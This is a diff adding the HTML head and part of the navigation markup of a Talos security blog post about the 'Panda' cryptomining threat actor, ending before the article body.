@@ -1,0 +1,846 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <title>Cryptocurrency miners aren’t dead yet: Documenting the voracious but simple “Panda”</title>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/bootstrap.min.css?v=-xdjtZ-fV2QpS1r5">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/navigation.css?v=PhzoiGnw4ldwozL1">
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/footer.css?v=sVEdldiwj6rF6gHP">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/pagination.css?v=HruyeF1JUFuoy6Wu">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/banners.css?v=vI3KT68RWE95HKDs">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/style.css?v=idjnUZoOumC94rdj">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/prism.css?v=jqyaOB6z6CqMaOT4">
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/prism-vsc-dark-plus.css?v=xoEFwaYF1JkH_sqf">
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/prism-talos.css?v=kn8aYcNhO045nXac">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/landing-page.css?v=EPtrK0eJwYLqD25v">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/coverage-block.css?v=vBgCqINSTHrSh9PX">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;1,100;1,300;1,400&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Mono:wght@400;500&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;1,100;1,300;1,400&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/ghost-theme-utils@latest/dist/css/style.min.css" rel="stylesheet">
+
+
+    <link rel="icon" href="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/size/w256h256/2022/07/talos_o_square.png" type="image/png">
+    <link rel="canonical" href="https://blog.talosintelligence.com/panda-evolution/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Cisco Talos Blog">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Cryptocurrency miners aren’t dead yet: Documenting the voracious but simple “Panda”">
+    <meta property="og:description" content="By Christopher Evans and David Liebenberg.
+
+
+
+Executive summary A new threat actor named &quot;Panda&quot; has generated thousands of dollars worth of the Monero cryptocurrency through the use of remote access tools (RATs) and illicit cryptocurrency-mining malware. This is far from the most sophisticated actor we&#x27;ve ever seen, but">
+    <meta property="og:url" content="https://blog.talosintelligence.com/panda-evolution/">
+    <meta property="og:image" content="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/-lf0T3p1bzKg/XYDfgN1h6mI/AAAAAAAAB7o/HvFMxzb8QhQbUO85JND7yrZfjwu7xAfTACLcBGAsYHQ/w1200-h630-p-k-no-nu/image4.png">
+    <meta property="article:published_time" content="2019-09-17T15:09:00.000Z">
+    <meta property="article:modified_time" content="2022-08-24T15:20:28.000Z">
+    <meta property="article:tag" content="Cryptocurrency">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Cryptocurrency miners aren’t dead yet: Documenting the voracious but simple “Panda”">
+    <meta name="twitter:description" content="By Christopher Evans and David Liebenberg.
+
+
+
+Executive summary A new threat actor named &quot;Panda&quot; has generated thousands of dollars worth of the Monero cryptocurrency through the use of remote access tools (RATs) and illicit cryptocurrency-mining malware. This is far from the most sophisticated actor we&#x27;ve ever seen, but">
+    <meta name="twitter:url" content="https://blog.talosintelligence.com/panda-evolution/">
+    <meta name="twitter:image" content="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/-lf0T3p1bzKg/XYDfgN1h6mI/AAAAAAAAB7o/HvFMxzb8QhQbUO85JND7yrZfjwu7xAfTACLcBGAsYHQ/w1200-h630-p-k-no-nu/image4.png">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="Nick Biasini">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="Cryptocurrency">
+    <meta name="twitter:site" content="@TalosSecurity">
+    <meta name="twitter:creator" content="@infosec_nick">
+    <meta property="og:image:width" content="1000">
+    <meta property="og:image:height" content="525">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Cisco Talos Blog",
+        "url": "https://blog.talosintelligence.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/2022/11/TalosBrand_ukraine.svg"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Nick Biasini",
+        "url": "https://blog.talosintelligence.com/author/nick-biasini/",
+        "sameAs": [
+            "https://x.com/infosec_nick"
+        ]
+    },
+    "headline": "Cryptocurrency miners aren’t dead yet: Documenting the voracious but simple “Panda”",
+    "url": "https://blog.talosintelligence.com/panda-evolution/",
+    "datePublished": "2019-09-17T15:09:00.000Z",
+    "dateModified": "2022-08-24T15:20:28.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/-lf0T3p1bzKg/XYDfgN1h6mI/AAAAAAAAB7o/HvFMxzb8QhQbUO85JND7yrZfjwu7xAfTACLcBGAsYHQ/w1200-h630-p-k-no-nu/image4.png",
+        "width": 1000,
+        "height": 525
+    },
+    "keywords": "Cryptocurrency",
+    "description": "By Christopher Evans and David Liebenberg.\n\n\n\nExecutive summary A new threat actor named \"Panda\" has generated thousands of dollars worth of the Monero cryptocurrency through the use of remote access tools (RATs) and illicit cryptocurrency-mining malware. This is far from the most sophisticated actor we've ever seen, but it still has been one of the most active attackers we've seen in Cisco Talos threat trap data. Panda's willingness to persistently exploit vulnerable web applications worldwide,",
+    "mainEntityOfPage": "https://blog.talosintelligence.com/panda-evolution/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 6.68">
+    <link rel="alternate" type="application/rss+xml" title="Cisco Talos Blog" href="https://blog.talosintelligence.com/rss/">
+    
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="4ffb0139d74ada998f4b141e4d" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://cisco-talos-blog.ghost.io/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://blog.talosintelligence.com/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=ShRHxgy4po8zN-Wf"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=WwnU9jw5ancNC8Gc">
+    <script defer src="/public/ghost-stats.min.js?v=vFcCUf6ZQ0Hyhc8h" data-stringify-payload="false" data-datasource="analytics_events" data-storage="localStorage" data-host="https://blog.talosintelligence.com/.ghost/analytics/api/v1/page_hit"  tb_site_uuid="afa04ee3-414f-4481-8d23-7e7c146f192e" tb_post_uuid="169b1f2f-afea-43d7-9e60-2c71e3cb60f1" tb_post_type="post" tb_member_uuid="undefined" tb_member_status="undefined" tb_gift_link=""></script><style>:root {--ghost-accent-color: #006db6;}</style>
+    <style type='text/css'>
+    img[src*="icon_check_white.svg"] { width: 20px; margin-left: 0px; margin-right: auto; }
+    
+    #ghost-portal-root { display: none; }
+</style>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-F45RVJG3BK"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-F45RVJG3BK');
+</script>
+</head>
+
+<body class="post-template tag-cryptocurrency">
+
+    <div id="mobile-page-header" class="desktop-hide mobile-page-header">
+    <a class="mobile-nav-home-link" href="/">
+        <div class="mobile-logo-wrapper">
+        </div>
+        <div class="mobile-home-title">Blog</div>
+    </a>
+    <div id="mobile-search-wrapper">
+        <button class="search-button mobile-search-button" data-ghost-search>
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+        </button>
+    </div>
+</div>
+
+<nav id="nav">
+    <input id="nav-trigger" class="nav-trigger" type="checkbox"/>
+    <label for="nav-trigger">
+        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="22px" height="16px" viewBox="0 0 22 16">
+            <g id="menu-icon">
+                <path fill="#FFFFFF" d="M20.5,3h-19C0.672,3,0,2.329,0,1.5S0.672,0,1.5,0h19C21.328,0,22,0.671,22,1.5S21.328,3,20.5,3z"></path>
+                <path fill="#FFFFFF" d="M20.5,9.5h-19C0.672,9.5,0,8.828,0,8c0-0.829,0.672-1.5,1.5-1.5h19C21.328,6.5,22,7.171,22,8   C22,8.828,21.328,9.5,20.5,9.5z"></path>
+                <path fill="#FFFFFF" d="M20.5,16h-19C0.672,16,0,15.328,0,14.5S0.672,13,1.5,13h19c0.828,0,1.5,0.672,1.5,1.5S21.328,16,20.5,16z"></path>
+            </g>
+        </svg>
+    </label>
+    <div id="top-nav-bar">
+    </div>
+
+    <div id="navigation">
+        <div class="navigation-logos-wrapper">
+            <div id="talos-logo-wrapper">
+                <a class="navbar-brand" href="https://talosintelligence.com">
+                </a>
+            </div>
+        </div>
+        <div class="navigation-links-wrapper">
+            <ul class="main-nav-list">
+                <li class="nav-item">
+                    <div class="primary-link-wrapper">
+                        <a class="primary_nav_link" href="https://talosintelligence.com/reputation">
+                            <div class="mobile-nav-icon"><!-- Generator: Adobe Illustrator 24.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" height="20px" width="20px" style="enable-background:new 0 0 20 20;" xml:space="preserve">
+                            <style type="text/css">
+                                .white{fill:#FFFFFF;}
+                            </style>
+                            <g>
+                                <path class="white" d="M19.5,9.5h-1.1c-0.3-4.2-3.6-7.6-7.8-7.8V0.5C10.5,0.2,10.3,0,10,0l0,0C9.7,0,9.5,0.2,9.5,0.5l0,0v1.1   C5.3,1.9,1.9,5.3,1.6,9.5H0.5C0.2,9.5,0,9.7,0,10s0.2,0.5,0.5,0.5l0,0h1.1c0.3,4.2,3.6,7.6,7.8,7.8v1.1c0,0.3,0.2,0.5,0.5,0.5l0,0   c0.3,0,0.5-0.2,0.5-0.5l0,0v-1.1c4.2-0.3,7.6-3.6,7.8-7.8h1.1c0.3,0,0.5-0.2,0.5-0.5C20,9.7,19.8,9.5,19.5,9.5 M16.6,10.5h0.7   c-0.3,3.6-3.2,6.5-6.8,6.8v-0.8c0-0.3-0.2-0.5-0.5-0.5l0,0c-0.3,0-0.5,0.2-0.5,0.5v0.8C5.8,17,3,14.2,2.7,10.5h0.8   C3.8,10.5,4,10.3,4,10S3.8,9.5,3.5,9.5l0,0H2.7C3,5.8,5.8,3,9.5,2.7v0.8C9.5,3.7,9.7,4,10,4l0,0c0.3,0,0.5-0.2,0.5-0.5V2.7   C14.2,3,17,5.8,17.3,9.5h-0.7c-0.3,0-0.5,0.2-0.5,0.5C16.1,10.3,16.3,10.5,16.6,10.5L16.6,10.5"></path>
+                                                            <circle class="white" cx="10" cy="10" r="3.2"></circle>
+                            </g>
+                            </svg>
+                            </div>
+                            <span class="top-nav-link-text">
+                                Intelligence Center
+                            </span>
+                        </a>
+                    </div>
+                    <input class="sub-nav-trigger" id="intelligence-sub-trigger" type="checkbox">
+                    <label class="sub-nav-trigger-label" for="intelligence-sub-trigger">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                            <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                            </g>
+                        </svg>
+
+                    </label>
+                    <ul class="sub-nav sub-nav-single-list">
+                        <li class="desktop-hide">
+                            <a class="mobile_nav_link" href="https://talosintelligence.com/reputation"><h1>Intelligence Center</h1>
+                            </a></li>
+                        <li class="desktop-hide">
+                            <label class="subnav-back-button" for="intelligence-sub-trigger">BACK</label>
+                        </li>
+                        <li><a class="secondary_nav_link" href="https://talosintelligence.com/reputation_center">Intelligence Search</a></li>
+                        <li><a class="secondary_nav_link" href="https://talosintelligence.com/reputation_center/email_rep">Email &amp; Spam Trends</a></li>
+                    </ul>
+                    <div class="desktop-hide subnav-overlay"><!-- Generator: Adobe Illustrator 24.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" height="20px" width="20px" style="enable-background:new 0 0 20 20;" xml:space="preserve">
+                        <style type="text/css">
+                            .white{fill:#FFFFFF;}
+                        </style>
+                                                <g>
+                            <path class="white" d="M19.5,9.5h-1.1c-0.3-4.2-3.6-7.6-7.8-7.8V0.5C10.5,0.2,10.3,0,10,0l0,0C9.7,0,9.5,0.2,9.5,0.5l0,0v1.1   C5.3,1.9,1.9,5.3,1.6,9.5H0.5C0.2,9.5,0,9.7,0,10s0.2,0.5,0.5,0.5l0,0h1.1c0.3,4.2,3.6,7.6,7.8,7.8v1.1c0,0.3,0.2,0.5,0.5,0.5l0,0   c0.3,0,0.5-0.2,0.5-0.5l0,0v-1.1c4.2-0.3,7.6-3.6,7.8-7.8h1.1c0.3,0,0.5-0.2,0.5-0.5C20,9.7,19.8,9.5,19.5,9.5 M16.6,10.5h0.7   c-0.3,3.6-3.2,6.5-6.8,6.8v-0.8c0-0.3-0.2-0.5-0.5-0.5l0,0c-0.3,0-0.5,0.2-0.5,0.5v0.8C5.8,17,3,14.2,2.7,10.5h0.8   C3.8,10.5,4,10.3,4,10S3.8,9.5,3.5,9.5l0,0H2.7C3,5.8,5.8,3,9.5,2.7v0.8C9.5,3.7,9.7,4,10,4l0,0c0.3,0,0.5-0.2,0.5-0.5V2.7   C14.2,3,17,5.8,17.3,9.5h-0.7c-0.3,0-0.5,0.2-0.5,0.5C16.1,10.3,16.3,10.5,16.6,10.5L16.6,10.5"></path>
+                                                    <circle class="white" cx="10" cy="10" r="3.2"></circle>
+                        </g>
+                        </svg>
+                    </div>
+                </li>
+                <li class="nav-item">
+                    <div class="primary-link-wrapper">
+                        <a class="primary_nav_link" href="https://talosintelligence.com/vulnerability_info"><div class="mobile-nav-icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="26px" height="20px" viewBox="0 0 26 20">
+                            <g id="vuln-icon" class="nav-icon">
+                                <path fill="#FFFFFF" d="M24.256,18.49L13.872,0.503C13.692,0.192,13.36,0,13,0c-0.359,0-0.692,0.192-0.872,0.503L1.744,18.49  c-0.18,0.312-0.18,0.695,0,1.006C1.924,19.809,2.257,20,2.616,20h20.769c0.359,0,0.691-0.191,0.871-0.504  C24.436,19.186,24.436,18.803,24.256,18.49 M14.268,18.215h-2.533v-1.85h2.533V18.215z M14.268,15.441h-2.533L10.89,6.515h4.222  L14.268,15.441z"></path>
+                            </g>
+                        </svg>
+                        </div>
+                            <span class="top-nav-link-text">
+                            Vulnerability Research
+                            </span>
+                        </a></div>
+                    <input class="sub-nav-trigger" id="vuln-sub-trigger" type="checkbox">
+                    <label class="sub-nav-trigger-label" for="vuln-sub-trigger">
+                        <div class="mobile-nav-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                            <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                            </g>
+                        </svg>
+                        </div>
+                    </label>
+                    <ul class="sub-nav sub-nav-single-list">
+                        <li class="desktop-hide">
+                            <a href="https://talosintelligence.com/vulnerability_info"><h1>Vulnerability Research</h1>
+                            </a></li>
+                        <li class="desktop-hide">
+                            <label class="subnav-back-button" for="vuln-sub-trigger">BACK</label>
+                        </li>
+                        <li><a class="vulnerabilty-info-nav-link" href="https://talosintelligence.com/vulnerability_reports">Vulnerability Reports</a></li>
+                        <li><a class="vulnerabilty-info-nav-link" href="https://talosintelligence.com/ms_advisories">Microsoft Advisories</a></li>
+                    </ul>
+                    <div class="desktop-hide subnav-overlay">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="26px" height="20px" viewBox="0 0 26 20">
+                        <g id="vuln-icon" class="nav-icon">
+                            <path fill="#FFFFFF" d="M24.256,18.49L13.872,0.503C13.692,0.192,13.36,0,13,0c-0.359,0-0.692,0.192-0.872,0.503L1.744,18.49  c-0.18,0.312-0.18,0.695,0,1.006C1.924,19.809,2.257,20,2.616,20h20.769c0.359,0,0.691-0.191,0.871-0.504  C24.436,19.186,24.436,18.803,24.256,18.49 M14.268,18.215h-2.533v-1.85h2.533V18.215z M14.268,15.441h-2.533L10.89,6.515h4.222  L14.268,15.441z"></path>
+                        </g>
+                        </svg>
+                    </div>
+                </li>
+
+
+               <li class="nav-item">
+                   <div class="primary-link-wrapper">
+                        <a class="primary_nav_link" href="https://talosintelligence.com/incident_response">
+                           <div class="mobile-nav-icon">
+                               <svg xmlns="http://www.w3.org/2000/svg" width="111.588" height="148.311" viewBox="0 0 111.588 148.311">
+                                    <path d="M1.181,128.446v15.7a4.167,4.167,0,0,0,4.167,4.167h100.9a4.167,4.167,0,0,0,4.167-4.167v-15.7a4.167,4.167,0,0,0-4.167-4.167H5.348a4.167,4.167,0,0,0-4.167,4.166M55.8,63.109a3.277,3.277,0,1,1,0,6.553c-10.344,0-20.755,8.578-20.755,18.57a3.277,3.277,0,1,1-6.554,0C28.489,73.947,41.93,63.109,55.8,63.109Zm0-12.016c-21.787,0-39.325,17.81-39.325,39.937v26.7H95.122V91.03c0-22.128-17.537-39.937-39.324-39.937m52.365-38.3a3.291,3.291,0,0,0-2.254,1.024L88.432,31.294a3.283,3.283,0,0,0,4.642,4.644l17.478-17.479a3.278,3.278,0,0,0-2.389-5.666m-105.138,0a3.276,3.276,0,0,0-1.98,5.666L18.522,35.938a3.283,3.283,0,0,0,4.643-4.644L5.687,13.817A3.255,3.255,0,0,0,3.025,12.793ZM55.389.026a3.276,3.276,0,0,0-2.867,3.345V19.642a3.277,3.277,0,1,0,6.554,0V3.371A3.283,3.283,0,0,0,55.389.026Z" fill="#fff"></path>
+                                </svg>
+                            </div>
+                            <span class="top-nav-link-text">
+                                Incident Response
+                            </span>
+                       </a>
+                   </div>
+                   <input class="sub-nav-trigger" id="ir-sub-trigger" type="checkbox">
+                   <label class="sub-nav-trigger-label" for="ir-sub-trigger">
+                       <div class="mobile-nav-icon">
+                           <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                                <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                               <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                               </g>
+                           </svg>
+                       </div>
+                   </label>
+                   <ul class="sub-nav sub-nav-single-list">
+                       <li class="desktop-hide">
+                           <a href="/incident_response">
+                               <h1>Incident Response</h1>
+                           </a>
+                        </li>
+                       <li class="desktop-hide">
+                           <label class="subnav-back-button" for="ir-sub-trigger">BACK</label>
+                       </li>
+                       <li>
+                           <a class="secondary_nav_link" href="https://talosintelligence.com/incident_response/services#reactive-services">Reactive Services</a>
+                       </li>
+                       <li>
+                           <a class="secondary_nav_link" href="https://talosintelligence.com/incident_response/services#proactive-services">Proactive Services</a></li>
+                       <li>
+                           <a href="https://talosintelligence.com/incident_response/contact">Emergency Support</a>
+                        </li>
+                   </ul>
+                   <div class="desktop-hide subnav-overlay"><svg xmlns="http://www.w3.org/2000/svg" width="111.588" height="148.311" viewBox="0 0 111.588 148.311">
+                     <path d="M1.181,128.446v15.7a4.167,4.167,0,0,0,4.167,4.167h100.9a4.167,4.167,0,0,0,4.167-4.167v-15.7a4.167,4.167,0,0,0-4.167-4.167H5.348a4.167,4.167,0,0,0-4.167,4.166M55.8,63.109a3.277,3.277,0,1,1,0,6.553c-10.344,0-20.755,8.578-20.755,18.57a3.277,3.277,0,1,1-6.554,0C28.489,73.947,41.93,63.109,55.8,63.109Zm0-12.016c-21.787,0-39.325,17.81-39.325,39.937v26.7H95.122V91.03c0-22.128-17.537-39.937-39.324-39.937m52.365-38.3a3.291,3.291,0,0,0-2.254,1.024L88.432,31.294a3.283,3.283,0,0,0,4.642,4.644l17.478-17.479a3.278,3.278,0,0,0-2.389-5.666m-105.138,0a3.276,3.276,0,0,0-1.98,5.666L18.522,35.938a3.283,3.283,0,0,0,4.643-4.644L5.687,13.817A3.255,3.255,0,0,0,3.025,12.793ZM55.389.026a3.276,3.276,0,0,0-2.867,3.345V19.642a3.277,3.277,0,1,0,6.554,0V3.371A3.283,3.283,0,0,0,55.389.026Z" fill="#fff"></path>
+                   </svg>
+                </div>
+               </li>
+
+
+
+
+
+                <li class="nav-item">
+                    <a class="primary_nav_link" href="https://blog.talosintelligence.com">
+                        <div class="mobile-nav-icon">
+                        <!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" width="260px" height="296.5px" viewBox="0 0 260 296.5" enable-background="new 0 0 260 296.5" xml:space="preserve">
+                        <path fill="#FFFFFF" d="M243.586,42.404h-14.448c-0.943-4.513-3.143-8.813-6.616-12.33L201.793,9.098  c-4.7-4.757-10.972-7.377-17.66-7.377c-6.578,0-12.777,2.547-17.457,7.173l-33.875,33.511H17.586c-6.6,0-12,5.399-12,12V226.28  c0,6.6,5.4,12,12,12H153.83l84.21,56.278l-27.448-56.278h32.994c6.6,0,12-5.4,12-12V54.404  C255.586,47.804,250.186,42.404,243.586,42.404z M214.662,48.045c-0.01,0.2-0.021,0.399-0.044,0.599  c-0.008,0.069-0.021,0.139-0.031,0.207c-0.046,0.345-0.113,0.688-0.196,1.026c-0.034,0.137-0.063,0.273-0.103,0.408  c-0.039,0.135-0.087,0.267-0.133,0.399c-0.051,0.151-0.102,0.302-0.16,0.45c-0.049,0.126-0.105,0.249-0.16,0.373  c-0.068,0.153-0.139,0.307-0.216,0.457c-0.059,0.116-0.12,0.23-0.184,0.345c-0.088,0.157-0.181,0.312-0.278,0.465  c-0.065,0.104-0.13,0.206-0.2,0.308c-0.115,0.168-0.239,0.33-0.366,0.492c-0.064,0.081-0.124,0.165-0.19,0.244  c-0.199,0.238-0.409,0.472-0.635,0.694L82.458,182.308l-47.932,12.871l13.427-47.74L177.223,19.561  c1.917-1.895,4.414-2.84,6.911-2.84c2.534,0,5.068,0.975,6.99,2.92l20.726,20.974c0.545,0.552,1.002,1.156,1.39,1.79  c0.574,0.938,0.975,1.951,1.206,2.993c0.004,0.021,0.01,0.04,0.014,0.06c0.049,0.226,0.086,0.453,0.119,0.682  c0.008,0.06,0.017,0.118,0.024,0.178c0.026,0.211,0.045,0.424,0.058,0.636c0.004,0.077,0.007,0.153,0.009,0.23  c0.007,0.203,0.011,0.407,0.005,0.61C214.673,47.877,214.666,47.961,214.662,48.045z"></path>
+                        </svg>
+                    </div>
+                        <span class="top-nav-link-text">Blog</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a class="primary_nav_link" href="https://support.talosintelligence.com">
+                        <div class="mobile-nav-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="26px" height="20px" viewBox="0 0 123.17 159.292">
+                            <path d="M61.59,0,0,17.069v85.32c0,23.472,61.59,56.9,61.59,56.9s61.58-36.288,61.58-56.9V17.069Zm-.433,149.746C38.314,136.662,8.128,114.3,8.128,102.389V23.239l53.029-14.7Z" fill="#fff"></path>
+                        </svg>
+                        </div>
+                        <span class="top-nav-link-text">Support</span>
+                    </a>
+                </li>
+            </ul>
+
+
+<!--                <li class="nav-item desktop-hide">-->
+<!--                    <button class="search-button" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg> <span>Search Blog</span></button>-->
+<!--                </li>-->
+
+            <ul class="secondary-nav-list">
+                <div class="more-desktop-link">
+                    <div class="more-link-wrapper">
+                        <span class="more-nav-link">
+                            <div class="desktop-nav-icon more-menu-icon">
+                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="22px" height="16px" viewBox="0 0 22 16">
+                                <g id="menu-icon">
+                                    <path fill="#FFFFFF" d="M20.5,3h-19C0.672,3,0,2.329,0,1.5S0.672,0,1.5,0h19C21.328,0,22,0.671,22,1.5S21.328,3,20.5,3z"></path>
+                                    <path fill="#FFFFFF" d="M20.5,9.5h-19C0.672,9.5,0,8.828,0,8c0-0.829,0.672-1.5,1.5-1.5h19C21.328,6.5,22,7.171,22,8   C22,8.828,21.328,9.5,20.5,9.5z"></path>
+                                    <path fill="#FFFFFF" d="M20.5,16h-19C0.672,16,0,15.328,0,14.5S0.672,13,1.5,13h19c0.828,0,1.5,0.672,1.5,1.5S21.328,16,20.5,16z"></path>
+                                </g>
+                                </svg>
+                            </div>
+                            <span class="top-nav-link-text top-nav-more-text">
+                            More
+                            </span>
+                        </span>
+                    </div>
+                </div>
+                <li class="nav-item more-text-link">
+                    <div class="more-link-wrapper more-link-wrapper-mobile">
+                        <span class="more-nav-link">
+                            <div class="mobile-nav-icon"><!-- Generator: Adobe Illustrator 24.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" style="enable-background:new 0 0 20 20;" width="25px" height="25px" xml:space="preserve">
+                                <style type="text/css">
+                                    .white{fill:#FFFFFF;}
+                                </style>
+                                <path class="white" d="M19.4,17.1c0,0.1-0.1,0-0.2,0c0,0-1.3-0.9-2-1.4c-0.2-0.1-0.5-0.1-0.6,0.1c-0.3,0.3-0.6,0.8-0.9,1.3  c-0.1,0.2-0.1,0.5,0.1,0.6l2,1.5c0.1,0,0,0.1,0.1,0.2c0,0.1,0,0.1-0.1,0.2c-1.2,0.5-2.6,0.2-3.5-0.7c-0.8-0.9-1-2-0.7-3.1L4.5,6.5  c-1,0.3-2.3,0-3-0.9c-0.8-0.9-1.1-1.7-1-2.7c0-0.1,0-0.1,0.1-0.2c0.1,0,0.2,0.1,0.2,0.1l2,1.5C3,4.4,3.3,4.5,3.4,4.2  c0,0,0.5-0.8,0.9-1.3c0.1-0.2,0.1-0.5-0.1-0.6L2.3,0.9c-0.1,0,0-0.1-0.1-0.3c0-0.1,0-0.1,0.1-0.2C3.5-0.1,5,0.2,5.8,1.1  c0.8,0.9,1,2,0.7,3.1l9.1,9.3c1-0.3,2.3,0,3,0.9c0.7,0.7,0.9,1.5,0.9,2.5C19.5,16.9,19.5,17,19.4,17.1z"></path>
+                                </svg>
+                            </div>
+                            <span class="top-nav-link-text top-nav-more-text">
+                            Security Resources
+                            </span>
+                        </span>
+                    </div>
+                    <input class="sub-nav-trigger" id="security-resources-sub-trigger" type="checkbox">
+                    <label class="sub-nav-trigger-label" for="security-resources-sub-trigger">
+                        <div class="mobile-nav-icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                            <g>
